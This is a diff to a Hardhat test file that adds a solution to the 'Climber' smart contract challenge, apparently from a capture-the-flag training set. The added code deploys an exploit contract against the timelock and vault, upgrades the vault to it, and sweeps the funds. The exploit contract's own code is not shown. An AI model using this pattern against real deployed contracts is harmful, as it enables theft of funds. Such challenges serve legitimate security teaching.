@@ -1,6 +1,6 @@
 const { ethers, upgrades } = require('hardhat');
 const { expect } = require('chai');
-const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
+const { setBalance, time } = require('@nomicfoundation/hardhat-network-helpers');
 
 describe('[Challenge] Climber', function () {
     let deployer, proposer, sweeper, player;
@@ -58,7 +58,20 @@ describe('[Challenge] Climber', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-    });
+       
+        const exploiterContract = await ethers.getContractFactory('ClimberVaultExploit',player);
+
+        const exploiter = await exploiterContract.deploy(timelock.address, vault.address);
+
+        (await exploiter.exploit()).wait();
+
+        
+        const newImpl = await ethers.getContractAt('ClimberVaultExploit', vault.address);
+        await newImpl.connect(player).sweep();
+        
+        
+    })
+
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
